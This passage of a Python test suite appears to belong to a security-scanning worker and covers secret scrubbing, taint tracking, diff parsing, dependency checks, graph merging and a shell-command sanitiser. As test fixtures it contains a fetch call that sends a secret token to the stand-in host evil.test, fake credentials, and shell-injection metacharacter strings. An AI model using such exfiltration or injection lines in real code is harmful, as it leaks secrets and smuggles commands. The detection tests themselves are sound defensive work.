"""Comprehensive tests covering gaps across all worker modules.

Covers: security, construction (edge cases), scan (parse/secret/bootstrap/review),
sca (version comparison), graph_merge (error paths), vm (forbidden tokens),
notifications (channel sanitization), graph_query (error paths),
enrichment (annotation parsing, clustering).
"""
from __future__ import annotations

import json
import pytest
from sqlalchemy import select
from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

from sentinel_worker.models import Base, Edge, Finding, Graph, Node, Run


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _engine():
    return create_async_engine("sqlite+aiosqlite:///:memory:")


async def _session_factory(engine):
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    return async_sessionmaker(engine, expire_on_commit=False)


# ===========================================================================
# security.py
# ===========================================================================

class TestSecurity:
    def test_known_safe_example_key_not_flagged_by_find_candidates(self):
        """AKIAIOSFODNN7EXAMPLE is in the allowlist — find_secret_candidates skips it."""
        from sentinel_worker.security import find_secret_candidates, SAFE_SECRET_EXAMPLES
        assert "AKIAIOSFODNN7EXAMPLE" in SAFE_SECRET_EXAMPLES
        # The allowlist suppresses it in find_secret_candidates
        result = find_secret_candidates("key=AKIAIOSFODNN7EXAMPLE")
        assert not any(v == "AKIAIOSFODNN7EXAMPLE" for _, v in result)

    def test_real_aws_key_is_scrubbed(self):
        from sentinel_worker.security import scrub_secrets
        result = scrub_secrets("AKIA1234567890ABCDEF extra text")
        assert "AKIA1234567890ABCDEF" not in result
        assert "[REDACTED:aws_access_key_id]" in result

    def test_fingerprint_differs_across_repos(self):
        from sentinel_worker.security import compute_fingerprint
        a = compute_fingerprint("repo-A", "auth.ts", "sqli")
        b = compute_fingerprint("repo-B", "auth.ts", "sqli")
        assert a != b

    def test_fingerprint_differs_across_vuln_types(self):
        from sentinel_worker.security import compute_fingerprint
        a = compute_fingerprint("repo", "auth.ts", "sqli")
        b = compute_fingerprint("repo", "auth.ts", "cmdi")
        assert a != b

    def test_fingerprint_is_deterministic(self):
        from sentinel_worker.security import compute_fingerprint
        assert compute_fingerprint("r", "f.py", "xss") == compute_fingerprint("r", "f.py", "xss")

    def test_all_lowercase_string_not_a_secret(self):
        from sentinel_worker.security import _looks_like_secret
        assert _looks_like_secret("alllowercasewithoutdigits") is False

    def test_all_uppercase_string_not_a_secret(self):
        from sentinel_worker.security import _looks_like_secret
        assert _looks_like_secret("ALLUPPERCASEWITHOUTDIGITS") is False

    def test_hex_string_not_a_secret(self):
        from sentinel_worker.security import find_secret_candidates
        # Pure hex → ignored even if long
        result = find_secret_candidates("deadbeefcafe1234deadbeefcafe1234")
        assert result == []

    def test_uuid_not_a_secret(self):
        from sentinel_worker.security import find_secret_candidates, scrub_secrets
        uuid = "123e4567-e89b-12d3-a456-426614174000"
        assert find_secret_candidates(uuid) == []
        assert scrub_secrets(uuid) == uuid

    def test_find_secret_candidates_returns_aws_key(self):
        from sentinel_worker.security import find_secret_candidates
        candidates = find_secret_candidates("AKIA1234567890ABCDEF")
        types = [kind for kind, _ in candidates]
        assert "aws_access_key_id" in types

    def test_mixed_class_secret_detected(self):
        from sentinel_worker.security import find_secret_candidates
        # Has lower, upper, digit, special → should be flagged
        secret = "sk-Ant_1234567890abcdefghijklmnopQRSTUV"
        candidates = find_secret_candidates(secret)
        assert len(candidates) > 0


# ===========================================================================
# construction.py — pure-function edge cases
# ===========================================================================

class TestConstructionPureFunctions:
    def test_collapse_posix_path_resolves_dotdot(self):
        from sentinel_worker.construction import _collapse_posix_path
        assert _collapse_posix_path("a/b/../c") == "a/c"
        assert _collapse_posix_path("a/b/../../c") == "c"

    def test_collapse_posix_path_removes_leading_dot(self):
        from sentinel_worker.construction import _collapse_posix_path
        assert _collapse_posix_path("./a/b") == "a/b"

    def test_collapse_posix_path_handles_double_slash(self):
        from sentinel_worker.construction import _collapse_posix_path
        assert _collapse_posix_path("a//b") == "a/b"

    def test_is_next_route_true_for_app_api(self):
        from sentinel_worker.construction import _is_next_route
        assert _is_next_route("src/app/api/users/route.ts") is True

    def test_is_next_route_true_for_pages_api(self):
        from sentinel_worker.construction import _is_next_route
        assert _is_next_route("src/pages/api/auth.ts") is True

    def test_is_next_route_false_for_non_api(self):
        from sentinel_worker.construction import _is_next_route
        assert _is_next_route("src/components/Button.tsx") is False

    def test_next_route_path_strips_route_suffix(self):
        from sentinel_worker.construction import _next_route_path
        assert _next_route_path("src/app/api/users/route.ts") == "/api/users"

    def test_next_route_path_for_pages_api(self):
        from sentinel_worker.construction import _next_route_path
        assert _next_route_path("pages/api/auth.ts") == "/api/auth"

    def test_next_method_detects_get_export(self):
        from sentinel_worker.construction import _next_method
        assert _next_method("export async function GET() { return Response.json({}) }") == "GET"

    def test_next_method_detects_post_export(self):
        from sentinel_worker.construction import _next_method
        assert _next_method("export function POST(req) {}") == "POST"

    def test_next_method_defaults_to_any(self):
        from sentinel_worker.construction import _next_method
        assert _next_method("export default function handler() {}") == "ANY"

    def test_intent_for_name_auth(self):
        from sentinel_worker.construction import _intent_for_name
        assert "auth" in _intent_for_name("authenticateUser").lower()

    def test_intent_for_name_db(self):
        from sentinel_worker.construction import _intent_for_name
        assert "database" in _intent_for_name("queryDb").lower()

    def test_intent_for_name_handler(self):
        from sentinel_worker.construction import _intent_for_name
        assert "handler" in _intent_for_name("routeHandler").lower()

    def test_intent_for_name_generic(self):
        from sentinel_worker.construction import _intent_for_name
        result = _intent_for_name("frobnicate")
        assert len(result) > 0

    def test_has_obvious_parse_error_detects_unmatched_brace(self):
        from sentinel_worker.construction import _has_obvious_parse_error
        assert _has_obvious_parse_error("function f() { if (x) {") is True

    def test_has_obvious_parse_error_false_for_valid(self):
        from sentinel_worker.construction import _has_obvious_parse_error
        assert _has_obvious_parse_error("function f() { return 1; }") is False

    def test_resolve_module_path_with_ts_extension(self):
        from sentinel_worker.construction import _resolve_module_path
        known = {"services/users.ts"}
        result = _resolve_module_path("routes/profile.ts", "../services/users", known)
        assert result == "services/users.ts"

    def test_resolve_module_path_index_js(self):
        from sentinel_worker.construction import _resolve_module_path
        known = {"utils/index.js"}
        result = _resolve_module_path("app.js", "./utils", known)
        assert result == "utils/index.js"

    def test_resolve_module_path_none_when_not_found(self):
        from sentinel_worker.construction import _resolve_module_path
        known = {"other/file.ts"}
        assert _resolve_module_path("app.ts", "./missing", known) is None

    def test_http_path_returns_path_from_absolute_url(self):
        from sentinel_worker.construction import _http_path
        assert _http_path("https://api.example.com/api/users") == "/api/users"

    def test_http_path_returns_relative_path(self):
        from sentinel_worker.construction import _http_path
        assert _http_path("/api/users") == "/api/users"

    def test_http_path_returns_none_for_bare_hostname(self):
        from sentinel_worker.construction import _http_path
        assert _http_path("not-a-url") is None

    def test_normalize_route_path_adds_leading_slash(self):
        from sentinel_worker.construction import _normalize_route_path
        assert _normalize_route_path("api/users") == "/api/users"

    def test_normalize_route_path_deduplicates_slash(self):
        from sentinel_worker.construction import _normalize_route_path
        assert _normalize_route_path("/api/users/") == "/api/users"


# ===========================================================================
# construction.py — DB tests
# ===========================================================================

class TestConstructionDB:
    @pytest.mark.asyncio
    async def test_sanitized_taint_edge_is_not_tainted(self):
        """When a sanitizer is called before the sink inside a function, the FLOWS_TO edge has tainted=False."""
        from sentinel_worker.construction import SourceFile, build_file_graph
        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                await build_file_graph(
                    session,
                    graph.id,
                    SourceFile(
                        path="safe.py",
                        content="def handle(request):\n    sanitize(request.GET)\n    db.query(safe_val)\n",
                        is_new=True,
                    ),
                )
            async with session.begin():
                edge = await session.scalar(select(Edge).where(Edge.kind == "FLOWS_TO"))
        assert edge is not None
        assert edge.sanitized is True
        assert edge.tainted is False

    @pytest.mark.asyncio
    async def test_taint_without_function_produces_no_edges(self):
        """Taint is function-scoped: bare param+sink at module level (no function) emits no FLOWS_TO edge."""
        from sentinel_worker.construction import SourceFile, build_file_graph
        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                await build_file_graph(
                    session,
                    graph.id,
                    SourceFile(
                        path="module.py",
                        content="req_val = request.GET['id']\ndb.query(req_val)\n",
                        is_new=True,
                    ),
                )
            async with session.begin():
                edges = list(await session.scalars(select(Edge).where(Edge.kind == "FLOWS_TO")))
        assert edges == []

    @pytest.mark.asyncio
    async def test_taint_does_not_cross_function_boundaries(self):
        """A param in one function and a sink in another must NOT produce a FLOWS_TO edge."""
        from sentinel_worker.construction import SourceFile, build_file_graph
        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                # get_input has a param but no sink; execute_sql has a sink but no param
                content = (
                    "def get_input(request):\n"
                    "    return request.GET['id']\n"
                    "\n"
                    "def execute_sql():\n"
                    "    cursor.execute('SELECT 1')\n"
                )
                await build_file_graph(
                    session, graph.id, SourceFile(path="split.py", content=content, is_new=True)
                )
            async with session.begin():
                edges = list(await session.scalars(select(Edge).where(Edge.kind == "FLOWS_TO")))
        assert edges == []

    @pytest.mark.asyncio
    async def test_taint_within_single_function_emits_edge(self):
        """A param and sink within the same function body produce a FLOWS_TO edge."""
        from sentinel_worker.construction import SourceFile, build_file_graph
        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                content = (
                    "def vulnerable(request):\n"
                    "    user_id = request.GET['id']\n"
                    "    db.query(user_id)\n"
                )
                await build_file_graph(
                    session, graph.id, SourceFile(path="vuln.py", content=content, is_new=True)
                )
            async with session.begin():
                edges = list(await session.scalars(select(Edge).where(Edge.kind == "FLOWS_TO")))
        assert len(edges) == 1
        assert edges[0].tainted is True

    @pytest.mark.asyncio
    async def test_python_fastapi_route_detected(self):
        """FastAPI @router.post routes should create ROUTE nodes."""
        from sentinel_worker.construction import SourceFile, build_file_graph
        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                await build_file_graph(
                    session,
                    graph.id,
                    SourceFile(
                        path="api.py",
                        content='@router.post("/items")\ndef create_item(item: Item): pass',
                        is_new=True,
                    ),
                )
            async with session.begin():
                route = await session.get(Node, {"graph_id": graph.id, "id": "route:api.py:POST /items"})
        assert route is not None
        assert route.is_entry_point is True

    @pytest.mark.asyncio
    async def test_typescript_file_creates_function_nodes(self):
        """TypeScript source produces FUNCTION nodes."""
        from sentinel_worker.construction import SourceFile, build_file_graph
        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                await build_file_graph(
                    session,
                    graph.id,
                    SourceFile(
                        path="utils.ts",
                        content="export function validateInput(data: string): boolean { return true; }",
                        is_new=True,
                    ),
                )
            async with session.begin():
                fn = await session.get(Node, {"graph_id": graph.id, "id": "fn:utils.ts:validateInput"})
        assert fn is not None
        assert fn.language == "typescript"

    @pytest.mark.asyncio
    async def test_empty_file_produces_file_node_only(self):
        """An empty file produces a FILE node but no FUNCTION nodes."""
        from sentinel_worker.construction import SourceFile, build_file_graph
        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                await build_file_graph(session, graph.id, SourceFile(path="empty.py", content="", is_new=True))
            async with session.begin():
                file_node = await session.get(Node, {"graph_id": graph.id, "id": "file:empty.py"})
                fns = list(await session.scalars(select(Node).where(Node.kind == "FUNCTION").where(Node.file == "empty.py")))
        assert file_node is not None
        assert fns == []

    @pytest.mark.asyncio
    async def test_is_new_flag_propagates_to_nodes(self):
        """Nodes from a SourceFile with is_new=True must have is_new=True."""
        from sentinel_worker.construction import SourceFile, build_file_graph
        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                await build_file_graph(
                    session,
                    graph.id,
                    SourceFile(path="new.py", content="def handler(): pass", is_new=True),
                )
            async with session.begin():
                nodes = list(await session.scalars(select(Node).where(Node.file == "new.py")))
        assert all(n.is_new for n in nodes)


# ===========================================================================
# scan.py — pure-function and DB tests
# ===========================================================================

class TestScanPure:
    def test_parse_unified_diff_returns_empty_for_empty_diff(self):
        from sentinel_worker.scan import parse_unified_diff
        assert parse_unified_diff("") == []

    def test_parse_unified_diff_returns_empty_for_context_only(self):
        from sentinel_worker.scan import parse_unified_diff
        assert parse_unified_diff(" unchanged line\n unchanged") == []

    def test_parse_unified_diff_multiple_files(self):
        from sentinel_worker.scan import parse_unified_diff
        diff = "+++ b/a.py\n+line1\n+++ b/b.py\n+line2"
        files = parse_unified_diff(diff)
        assert len(files) == 2
        assert files[0].path == "a.py"
        assert files[1].path == "b.py"

    def test_parse_unified_diff_ignores_removed_lines(self):
        from sentinel_worker.scan import parse_unified_diff
        diff = "+++ b/a.py\n+added\n-removed\n unchanged"
        files = parse_unified_diff(diff)
        assert "added" in files[0].content
        assert "removed" not in files[0].content

    def test_trace_event_produces_valid_json_with_kind(self):
        from sentinel_worker.scan import trace_event
        payload = json.loads(trace_event("scan.started", repo="test"))
        assert payload["kind"] == "scan.started"
        assert payload["repo"] == "test"
        assert "ts" in payload

    def test_trace_event_scrubs_nested_list_values(self):
        from sentinel_worker.scan import trace_event
        secret = "sk-Test_1234567890abcdefghijklmnop/QRSTUV"
        payload = json.loads(trace_event("test", tokens=[secret]))
        assert secret not in json.dumps(payload["tokens"])

    def test_secret_severity_critical_for_http_sink(self):
        from sentinel_worker.scan import _secret_severity
        assert _secret_severity("fetch('https://evil.test', body)") == "critical"

    def test_secret_severity_high_for_log_sink(self):
        from sentinel_worker.scan import _secret_severity
        assert _secret_severity("console.log(apiKey)") == "high"

    def test_secret_severity_medium_for_no_sink(self):
        from sentinel_worker.scan import _secret_severity
        assert _secret_severity("const key = 'secret'") == "medium"

    def test_is_manifest_detects_package_json(self):
        from sentinel_worker.scan import _is_manifest
        assert _is_manifest("package.json") is True
        assert _is_manifest("requirements.txt") is True
        assert _is_manifest("go.mod") is True
        assert _is_manifest("Cargo.toml") is True

    def test_is_manifest_false_for_source_files(self):
        from sentinel_worker.scan import _is_manifest
        assert _is_manifest("app.ts") is False
        assert _is_manifest("main.py") is False


class TestScanDB:
    @pytest.mark.asyncio
    async def test_secret_scan_suppressed_fingerprint_not_re_emitted(self):
        """A secret finding with a suppressed fingerprint must not be re-emitted."""
        from sentinel_worker.scan import scan_diff
        from sentinel_worker.security import compute_fingerprint
        from tests.conftest import MockLLMClient

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                run = await scan_diff(
                    session,
                    "repo",
                    "+++ b/app.js\n+fetch('https://evil.test', {body: 'sk-Test_1234567890abcdefghijklmnop/QRSTUV'})",
                    _llm=MockLLMClient(),
                )
            # Verify finding exists
            async with session.begin():
                finding = await session.scalar(select(Finding).where(Finding.vuln_type == "secret_leak"))
                assert finding is not None
                # Now suppress it
                finding.suppressed = True

            # Re-scan same content
            async with session.begin():
                run2 = await scan_diff(
                    session,
                    "repo",
                    "+++ b/app.js\n+fetch('https://evil.test', {body: 'sk-Test_1234567890abcdefghijklmnop/QRSTUV'})",
                    _llm=MockLLMClient(),
                )
            async with session.begin():
                count = len(list(await session.scalars(select(Finding).where(Finding.vuln_type == "secret_leak"))))

        # Only one finding should exist (not duplicated)
        assert count == 1

    @pytest.mark.asyncio
    async def test_scan_diff_never_sends_env_file_content_to_llm(self):
        """The SAST LLM prompt must never include .env-style file contents, even when
        they're part of the same diff as legitimate code changes."""
        from sentinel_worker.scan import scan_diff
        from tests.conftest import MockLLMClient

        engine = _engine()
        sm = await _session_factory(engine)
        llm = MockLLMClient()
        diff = (
            "diff --git a/app.py b/app.py\n"
            "--- a/app.py\n"
            "+++ b/app.py\n"
            "@@ -1 +1,2 @@\n"
            " import os\n"
            "+print('hello')\n"
            "diff --git a/.env.local b/.env.local\n"
            "--- a/.env.local\n"
            "+++ b/.env.local\n"
            "@@ -0,0 +1,2 @@\n"
            "+DATABASE_URL=postgres://user:hunter2@host/db\n"
            "+STRIPE_SECRET_KEY=sk_live_abcdef123456\n"
        )
        async with sm() as session:
            async with session.begin():
                await scan_diff(session, "repo", diff, _llm=llm)

        sast_prompts = [call["user"] for call in llm.calls if "user" in call]
        assert sast_prompts, "expected at least one SAST tool-use call"
        for prompt in sast_prompts:
            assert "hunter2" not in prompt
            assert "STRIPE_SECRET_KEY" not in prompt
            assert "DATABASE_URL" not in prompt
        # The rest of the diff must still reach the LLM.
        assert any("hello" in prompt for prompt in sast_prompts)

    @pytest.mark.asyncio
    async def test_bootstrap_repo_creates_run_with_completed_status(self):
        """bootstrap_repo completes a Run with status=completed."""
        from sentinel_worker.scan import bootstrap_repo
        from tests.conftest import MockLLMClient

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                run = await bootstrap_repo(
                    session,
                    "my-repo",
                    {"app.py": "def index(): return 'ok'"},
                    _llm=MockLLMClient(),
                )

        assert run.status == "completed"
        assert run.kind == "init"

    @pytest.mark.asyncio
    async def test_bootstrap_repo_stores_source_snapshot(self):
        """bootstrap_repo stores an encrypted source snapshot for each file."""
        from sentinel_worker.scan import bootstrap_repo
        from sentinel_worker.models import SourceFileSnapshot
        from tests.conftest import MockLLMClient

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                await bootstrap_repo(session, "my-repo", {"main.py": "print('hello')"}, _llm=MockLLMClient())
            async with session.begin():
                snapshot = await session.scalar(select(SourceFileSnapshot).where(SourceFileSnapshot.file_path == "main.py"))
        assert snapshot is not None
        assert snapshot.content_enc is not None

    @pytest.mark.asyncio
    async def test_scan_diff_creates_run_and_graph(self):
        """scan_diff always creates a Run record associated with a Graph."""
        from sentinel_worker.scan import scan_diff
        from tests.conftest import MockLLMClient

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                run = await scan_diff(
                    session,
                    "my-repo",
                    "+++ b/app.py\n+print('hello')",
                    _llm=MockLLMClient(),
                )
            async with session.begin():
                graph = await session.get(Graph, run.graph_id)
        assert graph is not None
        assert graph.kind == "main"

    @pytest.mark.asyncio
    async def test_blast_radius_includes_files_connected_by_edges(self):
        """_blast_radius_files returns source AND caller files when connected by CALLS edges."""
        from sentinel_worker.scan import _blast_radius_files
        from sentinel_worker.construction import SourceFile, build_source_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                await build_source_graph(
                    session,
                    graph.id,
                    [
                        SourceFile("services/auth.py", "def validate(): pass"),
                        SourceFile("routes/login.py", "from .services.auth import validate\ndef login(): return validate()"),
                    ],
                )
                # changed_paths = auth only; blast radius should include login too
                blast = await _blast_radius_files(session, graph.id, ["services/auth.py"])
        # Both files reachable via edges
        assert "services/auth.py" in blast

    @pytest.mark.asyncio
    async def test_sast_bootstrap_returns_empty_string_for_no_nodes(self):
        """sast_bootstrap with empty changed_node_ids and empty graph returns empty string."""
        from sentinel_worker.scan import sast_bootstrap
        from sentinel_worker.graph_query import GraphQuery

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                gq = GraphQuery(session, graph.id)
                result = await sast_bootstrap([], gq)
        assert result == ""


# ===========================================================================
# sca.py — version comparison & severity
# ===========================================================================

class TestSCAVersionComparison:
    def test_compare_versions_equal(self):
        from sentinel_worker.sca import _compare_versions
        assert _compare_versions("1.2.3", "1.2.3") == 0

    def test_compare_versions_less_than(self):
        from sentinel_worker.sca import _compare_versions
        assert _compare_versions("1.2.2", "1.2.3") == -1

    def test_compare_versions_greater_than(self):
        from sentinel_worker.sca import _compare_versions
        assert _compare_versions("2.0.0", "1.9.9") == 1

    def test_compare_versions_pads_shorter_version(self):
        from sentinel_worker.sca import _compare_versions
        # "1.2" vs "1.2.0" should be equal
        assert _compare_versions("1.2", "1.2.0") == 0

    def test_severity_from_osv_high_on_critical_impact(self):
        from sentinel_worker.sca import _severity_from_osv
        vuln = {"severity": [{"score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}]}
        assert _severity_from_osv(vuln) == "high"

    def test_severity_from_osv_medium_with_no_score(self):
        from sentinel_worker.sca import _severity_from_osv
        assert _severity_from_osv({}) == "medium"

    def test_severity_from_osv_medium_when_low_impact(self):
        from sentinel_worker.sca import _severity_from_osv
        vuln = {"severity": [{"score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L"}]}
        assert _severity_from_osv(vuln) == "medium"

    def test_parse_dependencies_ignores_unknown_manifest(self):
        from sentinel_worker.sca import parse_dependencies
        assert parse_dependencies("some/random/file.txt", "nothing here") == []

    def test_parse_requirements_txt_multiple_packages(self):
        from sentinel_worker.sca import parse_dependencies
        content = "flask==2.3.0\nrequests==2.28.1\nclick==8.1.0"
        deps = parse_dependencies("requirements.txt", content)
        names = {d.name for d in deps}
        assert {"flask", "requests", "click"} == names

    def test_version_parts_handles_prerelease_segment(self):
        from sentinel_worker.sca import _version_parts
        # Should not crash on "1.0.0-alpha"
        parts = _version_parts("1.0.0-alpha")
        assert parts[0] == 1

    def test_normalize_package_name_lowercases_and_strips(self):
        from sentinel_worker.sca import _normalize_package_name
        assert _normalize_package_name("My-Package.js") == "mypackagejs"


# ===========================================================================
# graph_merge.py — error paths
# ===========================================================================

class TestGraphMerge:
    @pytest.mark.asyncio
    async def test_merge_graph_raises_when_branch_not_found(self):
        from sentinel_worker.graph_merge import merge_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                main = Graph(account_id="a", repo_id="r", kind="main")
                session.add(main)
                await session.flush()
                with pytest.raises(ValueError, match="branch or main graph not found"):
                    await merge_graph(session, branch_graph_id="nonexistent", main_graph_id=main.id)

    @pytest.mark.asyncio
    async def test_merge_graph_raises_when_main_not_found(self):
        from sentinel_worker.graph_merge import merge_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                branch = Graph(account_id="a", repo_id="r", kind="branch")
                session.add(branch)
                await session.flush()
                with pytest.raises(ValueError, match="branch or main graph not found"):
                    await merge_graph(session, branch_graph_id=branch.id, main_graph_id="nonexistent")

    @pytest.mark.asyncio
    async def test_merge_graph_does_not_duplicate_existing_edges(self):
        """Merging a branch that adds nodes already merged must not duplicate edges."""
        from sentinel_worker.graph_merge import merge_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                main = Graph(account_id="a", repo_id="r", kind="main")
                branch = Graph(account_id="a", repo_id="r", kind="branch")
                session.add_all([main, branch])
                await session.flush()
                session.add_all([
                    Node(id="n:merge-A", graph_id=branch.id, kind="FUNCTION", name="A"),
                    Node(id="n:merge-B", graph_id=branch.id, kind="FUNCTION", name="B"),
                ])
                session.add(Edge(graph_id=branch.id, src="n:merge-A", dst="n:merge-B", kind="CALLS"))
                await session.flush()
                # First merge
                await merge_graph(session, branch_graph_id=branch.id, main_graph_id=main.id)

                # Second branch with the same node names/edge (different graph_id)
                branch2 = Graph(account_id="a", repo_id="r", kind="branch")
                session.add(branch2)
                await session.flush()
                # New branch has new nodes, but its edge points to the already-merged nodes
                session.add(Edge(graph_id=branch2.id, src="n:merge-A", dst="n:merge-B", kind="CALLS"))
                await session.flush()
                await merge_graph(session, branch_graph_id=branch2.id, main_graph_id=main.id)
            async with session.begin():
                edges = list(await session.scalars(
                    select(Edge).where(Edge.graph_id == main.id).where(Edge.kind == "CALLS")
                ))
        # Only one CALLS edge A→B even after two merges (deduplication)
        assert len(edges) == 1

    @pytest.mark.asyncio
    async def test_merge_graph_sets_branch_status_merged(self):
        from sentinel_worker.graph_merge import merge_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                main = Graph(account_id="a", repo_id="r", kind="main")
                branch = Graph(account_id="a", repo_id="r", kind="branch")
                session.add_all([main, branch])
                await session.flush()
                await merge_graph(session, branch_graph_id=branch.id, main_graph_id=main.id)
            async with session.begin():
                branch_reloaded = await session.get(Graph, branch.id)
        assert branch_reloaded.status == "merged"
        assert branch_reloaded.merged_at is not None

    @pytest.mark.asyncio
    async def test_merge_graph_propagates_tombstone_to_main(self):
        """A node deleted on the branch marks main's copy deleted on merge."""
        from sentinel_worker.graph_merge import merge_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                main = Graph(account_id="a", repo_id="r", kind="main")
                branch = Graph(account_id="a", repo_id="r", kind="branch")
                session.add_all([main, branch])
                await session.flush()
                # Same id lives in both graphs (composite key): live in main,
                # tombstoned on the branch.
                session.add(Node(id="n:gone", graph_id=main.id, kind="FUNCTION", name="gone"))
                session.add(Node(id="n:gone", graph_id=branch.id, kind="FUNCTION", name="gone", deleted=True))
                await session.flush()
                await merge_graph(session, branch_graph_id=branch.id, main_graph_id=main.id)
            async with session.begin():
                main_node = await session.get(Node, {"graph_id": main.id, "id": "n:gone"})
        assert main_node is not None
        assert main_node.deleted is True

    @pytest.mark.asyncio
    async def test_merge_graph_repoints_findings_onto_main(self):
        """Findings recorded on the branch graph follow the merge onto main."""
        from sentinel_worker.graph_merge import merge_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                main = Graph(account_id="a", repo_id="r", kind="main")
                branch = Graph(account_id="a", repo_id="r", kind="branch")
                session.add_all([main, branch])
                await session.flush()
                finding = Finding(
                    graph_id=branch.id,
                    vuln_type="sqli",
                    severity="high",
                    title="SQL injection",
                    description="d",
                    remediation="r",
                    fingerprint="fp:merge-repoint",
                    confirmed=True,
                )
                session.add(finding)
                await session.flush()
                finding_id = finding.id
                await merge_graph(session, branch_graph_id=branch.id, main_graph_id=main.id)
            async with session.begin():
                reloaded = await session.get(Finding, finding_id)
        assert reloaded.graph_id == main.id

    @pytest.mark.asyncio
    async def test_merge_3way_flags_conflict_when_main_advanced(self):
        """When main changes a node the branch also changed since the base, the
        merge records a conflict but still defers to the branch version."""
        from sentinel_worker.graph_merge import merge_graph
        from sentinel_worker.scan import get_or_create_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                main = await get_or_create_graph(session, "acme/repo")
                session.add(Node(id="n:x", graph_id=main.id, kind="FUNCTION", name="x", label="v0"))
                await session.flush()
                # Base snapshot captured here has n:x == v0.
                branch = await get_or_create_graph(session, "acme/repo", kind="branch", branch_name="f")
                session.add(Node(id="n:x", graph_id=branch.id, kind="FUNCTION", name="x", label="branch-v"))
                # Main advances the same node independently.
                main_node = await session.get(Node, {"graph_id": main.id, "id": "n:x"})
                main_node.label = "main-v"
                await session.flush()
                result = await merge_graph(session, branch_graph_id=branch.id, main_graph_id=main.id)
            async with session.begin():
                merged = await session.get(Node, {"graph_id": main.id, "id": "n:x"})
        assert result.had_base is True
        assert "n:x" in result.conflicts
        assert merged.label == "branch-v"  # branch wins per spec

    @pytest.mark.asyncio
    async def test_merge_3way_no_conflict_when_main_untouched(self):
        from sentinel_worker.graph_merge import merge_graph
        from sentinel_worker.scan import get_or_create_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                main = await get_or_create_graph(session, "acme/repo")
                session.add(Node(id="n:x", graph_id=main.id, kind="FUNCTION", name="x", label="v0"))
                await session.flush()
                branch = await get_or_create_graph(session, "acme/repo", kind="branch", branch_name="f")
                session.add(Node(id="n:x", graph_id=branch.id, kind="FUNCTION", name="x", label="branch-v"))
                await session.flush()
                result = await merge_graph(session, branch_graph_id=branch.id, main_graph_id=main.id)
            async with session.begin():
                merged = await session.get(Node, {"graph_id": main.id, "id": "n:x"})
        assert result.had_base is True
        assert result.conflicts == []
        assert merged.label == "branch-v"

    @pytest.mark.asyncio
    async def test_merge_without_base_falls_back_to_2way(self):
        """A legacy branch graph with no recorded base still merges (no conflict
        detection)."""
        from sentinel_worker.graph_merge import merge_graph

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                main = Graph(account_id="a", repo_id="r", kind="main")
                branch = Graph(account_id="a", repo_id="r", kind="branch")  # no base_graph_id
                session.add_all([main, branch])
                await session.flush()
                session.add(Node(id="n:y", graph_id=branch.id, kind="FUNCTION", name="y"))
                await session.flush()
                result = await merge_graph(session, branch_graph_id=branch.id, main_graph_id=main.id)
            async with session.begin():
                merged = await session.get(Node, {"graph_id": main.id, "id": "n:y"})
        assert result.had_base is False
        assert result.conflicts == []
        assert merged is not None


# ===========================================================================
# vm.py — forbidden tokens and egress rules
# ===========================================================================

class TestVM:
    @pytest.mark.parametrize("token", ["|", "||", "&", "&&", ";", ">", ">>", "<", "$(", "`"])
    def test_parse_safe_command_rejects_each_forbidden_token(self, token):
        from sentinel_worker.vm import parse_safe_command
        with pytest.raises(ValueError, match="shell metacharacters"):
            parse_safe_command(f"echo hello {token} evil")

    def test_parse_safe_command_accepts_clean_commands(self):
        from sentinel_worker.vm import parse_safe_command
        assert parse_safe_command("curl -sf http://localhost:3000/health") == [
